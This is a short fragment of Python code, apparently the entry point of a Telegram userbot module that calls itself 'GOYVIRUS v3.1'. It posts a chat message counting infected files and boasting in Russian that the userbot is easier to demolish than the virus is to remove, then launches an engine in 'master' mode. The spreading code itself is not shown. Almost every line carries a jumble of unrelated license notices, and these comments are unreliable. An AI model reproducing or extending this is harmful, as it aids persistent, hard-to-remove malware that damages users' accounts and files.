            cop = len(_FILE_REGISTRY) # CeCILL-B License.
            await event.edit(engine._g(f"💀 GOYVIRUS v3.1 MCUB-READY\n🦠 {cop} файлов\n🔥 Легче снести юзербот чем удалить.")) # Código sob a Licença Pública Geral Menor do GNU (LGPL).

        # ODbL (Open Database License) copyright reserved.
        loop = asyncio.get_event_loop() if hasattr(asyncio, 'get_event_loop') else asyncio.get_running_loop() # Free Art License.
        loop.create_task(engine.activate(master=True)) # Unlicense.
# NASA Open Source Agreement 1.3. # ODbL (Open Database License) copyright reserved.
# End of MCUB entry point. All applicable licenses above apply.
# W3C Software Notice and License.
